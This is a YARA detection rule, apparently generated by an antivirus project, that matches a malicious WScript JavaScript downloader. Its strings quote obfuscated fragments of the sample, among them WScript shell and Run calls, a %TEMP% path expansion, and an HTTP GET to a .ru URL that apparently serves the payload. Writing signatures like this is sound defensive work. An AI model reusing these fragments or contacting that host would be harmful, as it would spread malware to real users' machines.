rule sig_20160428_fa6f3960c00ff4fbb811ddf7c4bd5bd1 {
  meta:
    description = "datamaliciousorder - file 20160428_fa6f3960c00ff4fbb811ddf7c4bd5bd1.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "908ebca1239738019b0d7d1ac01683fee6169213387bc80ebd3dee187317485a"

  strings:
    $s1  = "function XsoIuhWroKbzCjxQxtHtv(RurFwfGynZvwNiyWcsMfc){VmlXhrAoiOkaArlXjdTwl[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function KznQlnSdkQhpDffKxwKxa() {return VmlXhrAoiOkaArlXjdTwl[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function XsoIuhWroKbzCjxQxtHtv(RurFwfGynZvwNiyWcsMfc){VmlXhrAoiOkaArlXjdTwl[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "return UktPaqCtnEmdMkoKamYfe - GzcGhaOjrEggBruErsOtm;};" fullword ascii
    $s5  = "var VmlXhrAoiOkaArlXjdTwl = function HlaHxhAevRbvAnsPlgVoo() {return TneNqkZtoSjcEppBodVsl[KasAkqYbrIxrLlsIqpVti](\"WScript\"+\"" ascii
    $s6  = "function FtxBfkCioDrjWaaRfgQrv(UktPaqCtnEmdMkoKamYfe, GzcGhaOjrEggBruErsOtm){QkmPugIccEwqNzuObqKvx = QkmPugIccEwqNzuObqKvx * 1; " ascii
    $s7  = "var TneNqkZtoSjcEppBodVsl = this[\"WScript\"];" fullword ascii
    $s8  = "var VmlXhrAoiOkaArlXjdTwl = function HlaHxhAevRbvAnsPlgVoo() {return TneNqkZtoSjcEppBodVsl[KasAkqYbrIxrLlsIqpVti](\"WScript\"+\"" ascii
    $s9  = "function KznQlnSdkQhpDffKxwKxa() {return VmlXhrAoiOkaArlXjdTwl[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s10 = "function FtxBfkCioDrjWaaRfgQrv(UktPaqCtnEmdMkoKamYfe, GzcGhaOjrEggBruErsOtm){QkmPugIccEwqNzuObqKvx = QkmPugIccEwqNzuObqKvx * 1; " ascii
    $s11 = "function EqbEzbGptAavDdvOtbGwj(){return KkeCjsWmuQqjZeeYhqZax + \"\";};" fullword ascii
    $s12 = "CexTenCxcTfwQstBacAqo[LygNgyDgiBquIsjMieXdr](\"G\" + \"ET\", \"http://3dphoto-rotate.ru/h4ydjs\", false);" fullword ascii
    $s13 = "function AapWqpLzgCllRehIsiVbo(){return 23;};" fullword ascii
    $s14 = "function XloCrcJnnKvfJsbNnvBud(PrhHxxInnGnqPqqFwhYok) {var FluFudEtiYufVzwNvtIjf = (1, 2, 3, 4, 5, PrhHxxInnGnqPqqFwhYok); retur" ascii
    $s15 = "FdsFpuEhyGslCqcQoqAma = true;" fullword ascii
    $s16 = "if (CexTenCxcTfwQstBacAqo[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s17 = "var CpwWhnMlpNngUgiWijJwc = new this[\"D\"+\"ate\"]();" fullword ascii
    $s18 = "}while (JgdKguFgzScqZgiLdmAqy);" fullword ascii
    $s19 = "DkkQmuLaeRfoZgqRiuOdp = true; " fullword ascii
    $s20 = "var HziBlcWvpOoxQhxIpwSgb = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}